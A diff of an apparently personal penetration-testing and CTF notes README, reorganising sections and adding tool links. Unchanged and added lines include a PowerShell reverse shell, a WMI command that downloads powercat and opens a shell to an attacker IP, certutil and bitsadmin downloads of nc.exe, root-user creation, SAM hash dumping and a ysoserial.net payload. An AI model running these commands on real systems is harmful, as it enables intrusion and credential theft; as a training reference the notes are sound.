@@ -6,36 +6,19 @@
 
 <!-- toc -->
 
-- [Passive Reconnaissance](#passive-reconnaissance)
-  - [Domain / DNS](#domain--dns)
-  - [API Search](#api-search)
-  - [Search Engine](#search-engine)
-  - [Internet archives search](#internet-archives-search)
-  - [Secret scanning](#secret-scanning)
-  - [File search](#file-search)
-  - [Other](#other)
-- [Active Reconnaissance](#active-reconnaissance)
-- [Network Scanner](#network-scanner)
-  - [Nmap](#nmap)
-- [Web Vulnerability Scanner](#web-vulnerability-scanner)
-- [Directory Bursting](#directory-bursting)
-- [Parameter Scanner](#parameter-scanner)
-- [JS Scanner](#js-scanner)
+- [Reconnaissance](#reconnaissance)
+  - [Passive Reconnaissance](#passive-reconnaissance)
+  - [Active Reconnaissance](#active-reconnaissance)
+- [Scanner](#scanner)
+  - [Network Scanner](#network-scanner)
+  - [Web Vulnerability Scanner](#web-vulnerability-scanner)
+  - [Directory Bursting](#directory-bursting)
+  - [Parameter Scanner](#parameter-scanner)
+  - [Endpoint Scanner](#endpoint-scanner)
 - [Penetration Testing](#penetration-testing)
   - [Tools](#tools)
   - [Training](#training)
-- [Penetration Testing Methodologies](#penetration-testing-methodologies)
-  - [Reverse Shell](#reverse-shell)
-  - [Full TTY](#full-tty)
-  - [Persistence](#persistence)
-  - [Privilege Escalation](#privilege-escalation)
-  - [Credential Access & Dumping](#credential-access--dumping)
-  - [Host Discovery](#host-discovery)
-  - [Port Forwarding](#port-forwarding)
-  - [Lateral movement](#lateral-movement)
-  - [File Transfer](#file-transfer)
-  - [Wordlist](#wordlist)
-  - [Post Exploitation](#post-exploitation)
+  - [Methodologies](#methodologies)
 - [Vulnerability](#vulnerability)
   - [Front-end](#front-end)
   - [XSS](#xss)
@@ -44,13 +27,14 @@
   - [XS Leaks](#xs-leaks)
   - [DOM Clobbering](#dom-clobbering)
   - [XS-Leaks](#xs-leaks)
-  - [SQLi](#sqli)
+  - [SQL Injection (SQLi)](#sql-injection-sqli)
   - [SSTI](#ssti)
   - [CSRF](#csrf)
   - [401/403 Bypass](#401403-bypass)
   - [Path Taversal / Directory Traversal](#path-taversal--directory-traversal)
   - [Command Injection](#command-injection)
   - [DNS Rebind Attack](#dns-rebind-attack)
+  - [SSRF](#ssrf)
   - [RCE](#rce)
   - [Information Disclosure](#information-disclosure)
   - [Apache Tomcat](#apache-tomcat)
@@ -78,10 +62,9 @@
 - [Reversing](#reversing)
   - [Windows](#windows)
   - [Python](#python)
-  - [Uncategorized](#uncategorized)
   - [Android](#android)
-  - [dotnet dnSpy](#dotnet-dnspy)
-  - [ysoserial.net in Kali](#ysoserialnet-in-kali)
+  - [dotnet](#dotnet)
+  - [ysoserial.net](#ysoserialnet)
 - [Web](#web)
   - [Specification](#specification)
   - [Vulnerability research approach](#vulnerability-research-approach)
@@ -104,9 +87,11 @@
 - [Crypto](#crypto)
   - [Hash Length Extension](#hash-length-extension)
   - [oneliner](#oneliner)
+  - [knonw plaintext attack](#knonw-plaintext-attack)
 - [Forensics](#forensics)
   - [Steganography](#steganography)
   - [DFIR](#dfir)
+  - [Memory](#memory)
   - [Other](#other-2)
 - [Networking](#networking)
   - [SSL/TLS](#ssltls)
@@ -141,6 +126,7 @@
   - [RDP](#rdp)
   - [RDP over SSH](#rdp-over-ssh)
   - [smbclient](#smbclient)
+  - [Tools](#tools-3)
 - [Virtualization](#virtualization)
   - [virt-manager](#virt-manager)
 - [Programming language](#programming-language)
@@ -165,7 +151,7 @@
 - [Static Site Generator](#static-site-generator)
 - [Certificates](#certificates)
   - [OSCP (Offensive Security Certified Professional)](#oscp-offensive-security-certified-professional)
-- [Tools](#tools-3)
+- [Tools](#tools-4)
   - [netcat](#netcat)
 - [Media](#media)
   - [Book](#book)
@@ -176,30 +162,39 @@
 
 <!-- tocstop -->
 
-## Passive Reconnaissance
+## Reconnaissance
+
+### Passive Reconnaissance
 
 - [PasteHunter](https://github.com/kevthehermit/PasteHunter) - Scanning pastebin with yara rules
 - [theHarvester](https://github.com/laramies/theHarvester) - E-mails, subdomains and names Harvester - OSINT
 
-### Domain / DNS
+#### Domain / DNS
 
 - [DNSdumpster.com](https://dnsdumpster.com/) - dns recon & research, find & lookup dns records
 - [ViewDNS.info](https://viewdns.info/) - Your one source for DNS related tools!
 - [crt.sh](https://crt.sh/) - Certificate Search
+- [Sublist3r](https://github.com/aboul3la/Sublist3r) - Fast subdomains enumeration tool for penetration testers
+- [subbrute](https://github.com/TheRook/subbrute) - A DNS meta-query spider that enumerates DNS records, and subdomains
+- [dnsrecon](https://github.com/darkoperator/dnsrecon) - DNS Enumeration Script
+- [massdns](https://github.com/blechschmidt/massdns) - A high-performance DNS stub resolver for bulk lookups and reconnaissance (subdomain enumeration)
+- [puredns](https://github.com/d3mondev/puredns) - Puredns is a fast domain resolver and subdomain bruteforcing tool that can accurately filter out wildcard subdomains and DNS poisoned entries
+- [resolvers](https://github.com/trickest/resolvers) - The most exhaustive list of reliable DNS resolvers
+- [DNS servers in Japan](https://public-dns.info/nameserver/jp.html)
 
-### API Search
+#### API Search
 
 - [ApisList](https://apislist.com/) - The Public APIs List, a curated list for the public web Apis
 - [RapidAPI](https://rapidapi.com/hub) - API Hub - Free Public & Open Rest APIs | Rapid
 - [APIs.guru](https://apis.guru/) - create a machine-readable Wikipedia for Web APIs in the OpenAPI Specification format
 
-### Search Engine
+#### Search Engine
 
 - [Shodan Search Engine](https://www.shodan.io/) - A search engine for Internet-connected devices
   - [Shodan Dorks](https://www.kitploit.com/2024/03/shodan-dorks.html) - Shodan Dorks by twitter.com/lothos612  Feel free to make suggestions
 - [Censys Search](https://search.censys.io/) - Censys helps organizations, individuals, and researchers find and monitor every server on the Internet to reduce exposure and improve security
 
-### Internet archives search
+#### Internet archives search
 
 - [waymore](https://github.com/xnl-h4ck3r/waymore)
 
@@ -207,7 +202,7 @@
   python3 ~/tools/waymore/waymore.py -i DOMAIN -oR ./waymore/$(date +%Y%m%d-%H%m%s)
   ```
 
-### Secret scanning
+#### Secret scanning
 
 - [trufflehog](https://github.com/trufflesecurity/trufflehog)
 
@@ -216,7 +211,7 @@
   trufflehog github --repo=https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments
   ```
 
-### File search
+#### File search
 
 - [gf](https://github.com/tomnomnom/gf)
 
@@ -234,20 +229,21 @@
   gf -dump urls
   ```
 
-#### gf pattern
+##### gf pattern
 
 - [1ndianl33t/Gf-Patterns](https://github.com/1ndianl33t/Gf-Patterns)
 - [emadshanab/Gf-Patterns-Collection](https://github.com/emadshanab/Gf-Patterns-Collection)
 
-### Other
+#### Other
 
 - [The Recon-ng Framework](https://github.com/lanmaster53/recon-ng) - Open Source Intelligence gathering tool aimed at reducing the time spent harvesting information from open sources
 - [Hunter](https://hunter.io/) - Hunter is your all-in-one email outreach platform
 - [Buckets Listing](https://buckets.grayhatwarfare.com/buckets?type=aws) - Public Buckets by GrayhatWarfare
 - [BuiltWith Technology Lookup](https://builtwith.com/) - Find out what websites are Built With
+- [fast-recon](https://github.com/DanMcInerney/fast-recon) - Does some google dorks against a domain
 - [厚生年金保険・健康保険　適用事業所検索システム \| 日本年金機構](https://www2.nenkin.go.jp/do/search_section/)
 
-## Active Reconnaissance
+### Active Reconnaissance
 
 - TLS Certificates without SNI
 
@@ -261,9 +257,11 @@
   openssl s_client -connect example.com:443 -servername example.com -showcerts < /dev/null
   ```
 
-## Network Scanner
+## Scanner
 
-### Nmap
+### Network Scanner
+
+Nmap
 
 ```bash
 nmap -p- --min-rate 5000 -sVC -Pn --open 192.168.0.123
@@ -283,7 +281,7 @@ Scanning Active Directory Controller
 nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sVC -sT -Pn <ip>
 ```
 
-## Web Vulnerability Scanner
+### Web Vulnerability Scanner
 
 - [nikto](https://github.com/sullo/nikto) - web server scanner
 
@@ -301,7 +299,7 @@ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sVC -sT -Pn <ip>
   whatweb --proxy 127.0.0.1:8080 -a 3 --max-threads 1 https://${DOMAIN}/
   ```
 
-## Directory Bursting
+### Directory Bursting
 
 - [ffuf](https://github.com/ffuf/ffuf) - Fast web fuzzer written in Go
 
@@ -310,7 +308,7 @@ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sVC -sT -Pn <ip>
   ffuf -ic -u https://${DOMAIN}/FUZZ -w /usr/share/wordlists/dirb/common.txt -r -t 2 -p 0.5-1 -ic -of all -o ffuf/$(date +%Y%m%d-%H%M%S)
   ```
 
-## Parameter Scanner
+### Parameter Scanner
 
 - [Paramspider](https://github.com/devanshbatham/ParamSpider) - Find HTTP Query Parameter from web.archive.org
 
@@ -330,7 +328,7 @@ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sVC -sT -Pn <ip>
   HTTP_PROXY=http://127.0.0.1:8080 HTTPS_PROXY=http://127.0.0.1:8080 arjun -u https://${DOMAIN}/ --stable --headers "User-Agent: hackerone_researcher_<yourname>"
   ```
 
-## JS Scanner
+### Endpoint Scanner
 
 - [LinkFinder](https://github.com/GerbenJavado/LinkFinder) - A python script that finds endpoints in JavaScript files
 
@@ -359,6 +357,9 @@ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sVC -sT -Pn <ip>
   echo https://${DOMAIN}/ | hakrawler | grep -iahE "https?://[^\"\\'> ]+\\.js" | grep -E "//${DOMAIN}" | sort -u | xargs wget -x -P javascripts -q
   find javascripts -type f -name "*.js" -exec js-beautify -r {} +
   ```
+
+- [relative-url-extractor](https://github.com/jobertabma/relative-url-extractor) - A small tool that extracts relative URLs from a file
+- [xnLinkFinder](https://github.com/xnl-h4ck3r/xnLinkFinder) - A python tool used to discover endpoints, potential parameters, and a target specific wordlist for a given target
 
 ## Penetration Testing
 
@@ -393,9 +394,9 @@ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sVC -sT -Pn <ip>
 - [Root Me](https://www.root-me.org/?lang=en)
 - [PentesterLab](https://pentesterlab.com/)
 
-## Penetration Testing Methodologies
+### Methodologies
 
-### Reverse Shell
+#### Reverse Shell
 
 - [Reverse Shell Generator](https://www.revshells.com/)
 - [php-reverse-shell \| pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
@@ -406,8 +407,9 @@ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sVC -sT -Pn <ip>
 - [hoaxshell](https://github.com/t3l3machus/hoaxshell)
 - [Villain](https://github.com/t3l3machus/Villain)
 - [Offensive-Reverse-Shell-Cheat-Sheet](https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet)
+- [Shell3er](https://github.com/yehia-mamdouh/Shell3er)
 
-#### PowerShell
+##### PowerShell
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);
@@ -426,7 +428,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 $client.Close()
 ```
 
-#### Listening
+##### Listening
 
 Metasploit Framework multi/handler payload
 
@@ -438,7 +440,7 @@ msfconsole -q -x "use exploit/multi/handler;\
                           run"
 ```
 
-### Full TTY
+#### Full TTY
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -459,7 +461,7 @@ reset
 - [Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 - [Upgrading simple (reverse-)shells to fully interactive TTYs](https://gist.github.com/rollwagen/1fdb6b2a8cd47a33b1ecf70fea6aafde)
 
-### Persistence
+#### Persistence
 
 - [nohup](https://www.gnu.org/software/coreutils/manual/html_node/nohup-invocation.html#nohup-invocation)
 - [besimorhino/powercat](https://github.com/besimorhino/powercat) - netshell features all in version 2 powershell
@@ -469,7 +471,7 @@ reset
 Invoke-Wmimethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.16.5/powercat.ps1'); mycat -c 10.10.16.5 -p 443 -e powershell;"
 ```
 
-#### Create root user
+##### Create root user
 
 ```bash
 # foo:$1$mysalt$4Lz7hS.y2V54mV2gJXEKR/:0:0::/tmp/foo:/bin/bash
@@ -497,10 +499,10 @@ ECHO ====================
 net users
 ```
 
-### Privilege Escalation
+#### Privilege Escalation
 
 - [Windows elevation of privileges](https://guif.re/windowseop)
-- [metasploit-framework/documentation/modules/post/multi/recon/local_exploit_suggester.md at master · rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md)
+- [local_exploit_suggester.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md)
 
 Identify process Windows
 
@@ -519,12 +521,19 @@ tasklist /v | findstr 2820
 RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
 ```
 
-### Credential Access & Dumping
+- [PrivescCheck](https://github.com/itm4n/PrivescCheck) - Privilege Escalation Enumeration Script for Windows
+- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+
+#### Credential Access & Dumping
 
 - [Dumping and Cracking mscash - Cached Domain Credentials - Red Teaming Experiments](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials#secretsdump)
 - [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) - A little tool to play with Windows security
 
-### Host Discovery
+```bash
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL -outputfile hash
+```
+
+#### Host Discovery
 
 Ping Sweep
 
@@ -538,9 +547,9 @@ Nmap ping scan `-sn` option
 nmap -sn --min-rate 5000 192.168.0.0/24
 ```
 
-### Port Forwarding
+#### Port Forwarding
 
-#### SSH Port Forwarding
+##### SSH Port Forwarding
 
 Dynamic
 
@@ -566,7 +575,7 @@ local port forwarding
 ssh -N -L 0.0.0.0:445:<target ip>:445 j0hn@10.11.1.252
 ```
 
-#### chisel
+##### chisel
 
 [jpillora/chisel](https://github.com/jpillora/chisel)
 
@@ -604,13 +613,13 @@ Target
 
 - [Tunneling and Port Forwarding - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
 
-### Lateral movement
+#### Lateral movement
 
 - [Derivative Local Admin. Intro | by Justin Warner | Medium](https://sixdub.medium.com/derivative-local-admin-cdd09445aac8)
 
-### File Transfer
+#### File Transfer
 
-#### PowerShell
+##### PowerShell
 
 Download file
 
@@ -647,7 +656,7 @@ powercat -c 10.1.1.1 -p 443 -i C:\inputfile
 powercat -l -p 8000 -of C:\inputfile
 ```
 
-#### cmd.exe
+##### cmd.exe
 
 ```cmd
 cmd /c bitsadmin /transfer pwn /download http://192.168.119.156/nc.exe C:\Windows\Tasks\nc.exe
@@ -658,7 +667,7 @@ certutil.exe -urlcache -split -f "http://192.168.119.156/nc.exe" nc.exe
 
 - [Basic Win CMD for Pentesters - HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#download)
 
-#### VBA Macro
+##### VBA Macro
 
 ```cmd
 Dim Str As String
@@ -668,11 +677,12 @@ CreateObject("Wscript.Shell").Run Str
 
 - [Basic PowerShell for Pentesters - HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
 
-#### SMB file share
+##### SMB file share
 
 ```bash
 # Kali
 impacket-smbserver <user> .
+impacket-smbserver -smb2support <user> .
 ```
 
 ```cmd
@@ -681,7 +691,7 @@ impacket-smbserver <user> .
 net use * \\<ip>\<user>
 ```
 
-### Wordlist
+#### Wordlist
 
 - [SecLists](https://github.com/danielmiessler/SecLists) - List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
 - [Assetnote Wordlists](https://wordlists.assetnote.io/) - This website provides you with wordlists that are up to date and effective against the most popular technologies on the internet.
@@ -691,6 +701,7 @@ net use * \\<ip>\<user>
 - [mentalist](https://github.com/sc0tfree/mentalist) - Mentalist is a graphical tool for custom wordlist generation. It utilizes common human paradigms for constructing passwords and can output the full wordlist as well as rules compatible with Hashcat and John the Ripper
 - [english-words](https://github.com/dwyl/english-words) - A text file containing 479k English words for all your dictionary/word-based projects e.g: auto-completion / autosuggestion
 - [username-anarchy](https://github.com/urbanadventurer/username-anarchy) - Username tools for penetration testing
+- [jwt-secrets](https://github.com/wallarm/jwt-secrets)
 
 custom wordlist from HTML
 
@@ -698,12 +709,13 @@ custom wordlist from HTML
 curl -s http://runner.htb/ | html2text | tr ' ' '\n' | tr -d '.,:*!' | sort -u > list.txt
 ```
 
-### Post Exploitation
+#### Post Exploitation
 
 - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - A swiss army knife for pentesting networks
 - [NetExec](https://github.com/Pennyw0rth/NetExec) - The Network Execution Tool, based on CrackMapExec
-- [Nishang](https://github.com/samratashok/nishang/tree/master) - Offensive PowerShell for red team, penetration testing and offensive security
-- [PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master) - This is a collection of PowerShell utilities
+- [Nishang](https://github.com/samratashok/nishang) - Offensive PowerShell for red team, penetration testing and offensive security
+- [PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite) - This is a collection of PowerShell utilities
+- [Powershell-PostExploitation](https://github.com/xpn/Powershell-PostExploitation) - Scripts created to help with post exploitation of a Windows host
 
 ## Vulnerability
 
@@ -718,7 +730,7 @@ curl -s http://runner.htb/ | html2text | tr ' ' '\n' | tr -d '.,:*!' | sort -u >
 ### Front-end
 
 - [Beyond XSS](https://aszx87410.github.io/beyond-xss/en/) - Explore the Web Front-end Security Universe
-- [BlackFan/content-type-research](https://github.com/BlackFan/content-type-research/tree/master)
+- [BlackFan/content-type-research](https://github.com/BlackFan/content-type-research)
 - [RenwaX23/XSS-Payloads](https://github.com/RenwaX23/XSS-Payloads) - List of XSS Vectors/Payloads
 
 ### XSS
@@ -732,6 +744,7 @@ curl -s http://runner.htb/ | html2text | tr ' ' '\n' | tr -d '.,:*!' | sort -u >
 - [Cross Site Scripting - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)
 - [Browser's XSS Filter Bypass Cheat Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
 - [s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
+- [traxss](https://github.com/M4cs/traxss)
 
 Refrected XSS checker
 
@@ -798,11 +811,12 @@ Prototype Pollution to RCE (PP2R)
 
 - [Introduction \| XS-Leaks Wiki](https://xsleaks.dev/)
 
-### SQLi
+### SQL Injection (SQLi)
 
 - [SQL Injection Payload List. PayloadBox | by #ismailtasdelen | Medium](https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b)
 - [The SQL Injection Knowledge Base](https://www.websec.ca/kb/sql_injection)
 - [payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)
+- [ghauri](https://github.com/r0oth3x49/ghauri) - An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws
 
 ### SSTI
 
@@ -810,7 +824,7 @@ Prototype Pollution to RCE (PP2R)
 - [Server Side Template Injection - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)
 - [payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)
 - [Jinja2 template injection filter bypasses \| Sebastian Neef - 0day.work](https://0day.work/jinja2-template-injection-filter-bypasses/)
-- [websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/tree/master)
+- [websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
 
 ### CSRF
 
@@ -822,6 +836,8 @@ Prototype Pollution to RCE (PP2R)
 ### 401/403 Bypass
 
 - [Ultimate 401 and 403 bypass methods](https://www.vidocsecurity.com/blog/401-and-403-bypass-how-to-do-it-right/)
+- [byp4xx](https://github.com/lobuhi/byp4xx)
+- [bypass-403](https://github.com/iamj0ker/bypass-403)
 
 ### Path Taversal / Directory Traversal
 
@@ -830,6 +846,7 @@ Prototype Pollution to RCE (PP2R)
 - [CTFのWebセキュリティにおけるPath Traversal, LFI/RFI (File Upload, ZipSlip)](https://blog.hamayanhamayan.com/entry/2021/12/08/220449)
 - [File Inclusion and Path Traversal - Web Applications Pentesting](https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/)
 - [LFI to RCE via PHP PEARCMD](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/#lfi-to-rce-via-php-pearcmd)
+- [evilarc](https://github.com/ptoomey3/evilarc) - Create tar/zip archives that can exploit directory traversal vulnerabilities
 
 ### Command Injection
 
@@ -841,6 +858,10 @@ Prototype Pollution to RCE (PP2R)
 - [1u.ms](http://1u.ms/)
 - [mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSer)
 
+### SSRF
+
+- [Gopherus](https://github.com/tarunkant/Gopherus) - This tool generates gopher link for exploiting SSRF and gaining RCE in various servers
+
 ### RCE
 
 - [CVE-2023-43177](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43177) - CrushFTP prior to 10.5.1 is vulnerable to Improperly Controlled Modification of Dynamically-Determined Object Attributes
@@ -849,6 +870,7 @@ Prototype Pollution to RCE (PP2R)
 ### Information Disclosure
 
 - [Sybil-Scan/imagemagick-lfi-poc: ImageMagick LFI PoC \[CVE-2022-44268\]](https://github.com/Sybil-Scan/imagemagick-lfi-poc) - CVE-2022-44268 ImageMagick 7.1.0-49 Arbitrary File Read
+- [GitTools](https://github.com/internetwache/GitTools) - A repository with 3 tools for pwn'ing websites with .git repositories available
 
 ### Apache Tomcat
 
@@ -907,7 +929,7 @@ Prototype Pollution to RCE (PP2R)
 - [Introduction | CTF Resources](http://ctfs.github.io/resources/)
 - [Introduction · CTF Field Guide](https://trailofbits.github.io/ctf/index.html)
 - [Introduction - CTF Wiki](https://ctf-wiki.org/en/)
-- [zardus/ctf-tools](https://github.com/zardus/ctf-tools)
+- [ctf-tools](https://github.com/zardus/ctf-tools)
 - [CTF-Heaven/Cheatsheets](https://github.com/thezakman/CTF-Heaven/tree/master/Cheatsheets)
 
 ### Other
@@ -1657,6 +1679,7 @@ buf3: 0x5593d3f5e2a0
 ## Reversing
 
 - [Ghidra](https://ghidra-sre.org/)
+  - [GhidRust](https://github.com/DMaroo/GhidRust)
 - [Compiler Explorer](https://godbolt.org/)
 - [Computer Organization and Design ARM edition.pdf](http://staff.ustc.edu.cn/~llxx/cod/reference_books/Computer%20Organization%20and%20Design%20ARM%20edition.pdf)
 - [Online x86 and x64 Intel Instruction Assembler](https://defuse.ca/online-x86-assembler.htm)
@@ -1670,16 +1693,14 @@ buf3: 0x5593d3f5e2a0
 
 ### Python
 
-#### pyc Decompiler
-
 - [python-uncompyle6](https://github.com/rocky/python-uncompyle6/) - A cross-version Python bytecode decompile
+- [python-decompile3](https://github.com/rocky/python-decompile3) - Python decompiler for 3.7-3.8 Stripped down from uncompyle6 so we can refactor and start to fix up some long-standing problems
 - [pycdc](https://github.com/zrax/pycdc) - C++ python bytecode disassembler and decompiler
 - [show_pyc.py](https://github.com/nedbat/coveragepy/blob/master/lab/show_pyc.py)
-
-### Uncategorized
-
 - [Pyarmor](https://github.com/dashingsoft/pyarmor) - A tool used to obfuscate python scripts, bind obfuscated scripts to fixed machine or expire obfuscated scripts.
 - [pyinstaller](https://github.com/pyinstaller/pyinstaller) - Freeze (package) Python programs into stand-alone executables
+- [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) - PyInstaller Extractor
+- [python-exe-unpacker](https://github.com/WithSecureLabs/python-exe-unpacker) - A helper script for unpacking and decompiling EXEs compiled from python code
 
 ### Android
 
@@ -1757,9 +1778,9 @@ The SHA1 algorithm specified for the -digestalg option is considered a security 
 The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
 ```
 
-### dotnet dnSpy
+### dotnet
 
-[dnSpy](https://github.com/dnSpy/dnSpy)
+[dnSpy](https://github.com/dnSpy/dnSpy) - .NET debugger and assembly editor
 
 ```shell
 # In Kali
@@ -1768,7 +1789,13 @@ winetricks dotnet6
 wine ~/tools/dnSpy/dnSpy.exe
 ```
 
-### ysoserial.net in Kali
+[ILSpy](https://github.com/icsharpcode/ILSpy) - .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (&more) - cross-platform!
+
+### ysoserial.net
+
+- [ysoserial.net](https://github.com/pwntester/ysoserial.net) - Deserialization payload generator for a variety of .NET formatters
+
+#### How to use in Kali Linux
 
 - [Mono Package for Wine is not installed - Ask Ubuntu](https://askubuntu.com/questions/841847/mono-package-for-wine-is-not-installed)
 
@@ -1778,6 +1805,10 @@ $ wine uninstaller --list
 {8c97cb9f-5366-4851-942a-4da7d5980ee8}|||Microsoft .NET Runtime - 6.0.36 (x86)
 {F63B90D5-B273-582F-8DF1-1A1351F6AEBE}|||Wine Mono Runtime
 {D26F6A69-D276-54AE-9328-B751F48EE85E}|||Wine Mono Windows Support
+```
+
+```bash
+wine ~/tools/ysoserial.net/Release/ysoserial.exe -p DotNetNuke -m run_command -c 'echo hello'
 ```
 
 ## Web
@@ -1817,6 +1848,7 @@ Webhook Hosting
 #### Fuzzing
 
 - [Continuously fuzzing Python C extensions \| Trail of Bits Blog](https://blog.trailofbits.com/2024/02/23/continuously-fuzzing-python-c-extensions/)
+- [Todesstern](https://github.com/kleiton0x00/Todesstern) - A simple mutator engine which focuses on finding unknown classes of injection vulnerabilities
 
 ### Burp Suite
 
@@ -1874,14 +1906,15 @@ Compiler / Build Packages
 - [GraphQL](https://graphql.org/)
 - [How to GraphQL - The Fullstack Tutorial for GraphQL](https://www.howtographql.com/)
 - [GraphQL - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
-- [chentsulin/awesome-graphql](https://github.com/chentsulin/awesome-graphql)
+- [awesome-graphql](https://github.com/chentsulin/awesome-graphql)
+- [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - a scripting engine to interact with a graphql endpoint for pentesting purposes
 
 ### Json Web Token (JWT)
 
 - [JWT Vulnerabilities (Json Web Tokens) - HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
 - [JWT - JSON Web Token - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/JSON%20Web%20Token/)
-- [ticarpi/jwt_tool: A toolkit for testing, tweaking and cracking JSON Web Tokens](https://github.com/ticarpi/jwt_tool)
-- [Home · ticarpi/jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki)
+- [jwt_tool](https://github.com/ticarpi/jwt_tool)
+  - [jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki)
 - [JSON Web Tokens - jwt.io](https://jwt.io/)
 - [Hacking JWT Tokens: jku Claim Misuse | by Shivam Bathla | Pentester Academy Blog](https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c)
 - [Bug bounty isn’t dying. It’s the future. · rez0](https://rez0.blog/hacking/cybersecurity/2021/01/10/bug-bounty-isnt-dying.html)
@@ -2167,6 +2200,7 @@ XMPP client
 
 RSA
 
+- [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) - RSA attack tool (mainly for ctf)
 - [RFC3447 Public-Key Cryptography Standards (PKCS) #1: RSA Cryptography](https://www.ietf.org/rfc/rfc3447.txt)
 - [CTF crypto 逆引き - ふるつき](https://furutsuki.hatenablog.com/entry/2021/03/16/095021)
 - [RSA暗号](https://www.komazawa-u.ac.jp/~w3c/lecture/RSA%E6%9A%97%E5%8F%B7.pdf)
@@ -2174,7 +2208,7 @@ RSA
 ### Hash Length Extension
 
 - [Hash Length Extension Attack - HackTricks](https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack)
-- [iagox86/hash_extender](https://github.com/iagox86/hash_extender)
+- [hash_extender](https://github.com/iagox86/hash_extender)
 
 Tested
 
@@ -2208,6 +2242,10 @@ $ echo -n "${secret}${newstr}" | sha256sum
 gcd = lambda a, b: b if (a:=a%b) == 0 else gcd(b, a)
 ```
 
+### knonw plaintext attack
+
+- [bkcrack](https://github.com/kimci86/bkcrack) - Crack legacy zip encryption with Biham and Kocher's known plaintext attack
+
 ## Forensics
 
 ### Steganography
@@ -2230,7 +2268,7 @@ gcd = lambda a, b: b if (a:=a%b) == 0 else gcd(b, a)
 - [VirusTotal](https://www.virustotal.com/gui/home/upload)
 - [Cisco Talos Intelligence Group - Comprehensive Threat Intelligence](https://www.talosintelligence.com/)
 - [Zero2Automated](https://courses.zero2auto.com/)
-- [sleuthkit/autopsy](https://github.com/sleuthkit/autopsy)
+- [autopsy](https://github.com/sleuthkit/autopsy)
 - [FTK Imager](https://www.exterro.com/digital-forensics-software/ftk-imager)
 - [CFReDS Portal](https://cfreds.nist.gov/)
 - [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md)
@@ -2250,6 +2288,15 @@ Report
 
 - [The DFIR Report](https://thedfirreport.com/)
 - [Research \| Trellix Stories](https://www.trellix.com/blogs/research/)
+
+### Memory
+
+#### Volatility
+
+- [volatility3](https://github.com/volatilityfoundation/volatility3)
+- [Volatility Foundation](https://volatilityfoundation.org/)
+- [OpenSSH-Session-Key-Recovery](https://github.com/fox-it/OpenSSH-Session-Key-Recovery) - Project containing several tools/ scripts to recover the OpenSSH session keys used to encrypt/ decrypt SSH traffic
+- [dockerfile-volatility](https://github.com/phocean/dockerfile-volatility) - Dockerfile to build a Docker image of the DFIR Volatility memory analysis framework
 
 ### Other
 
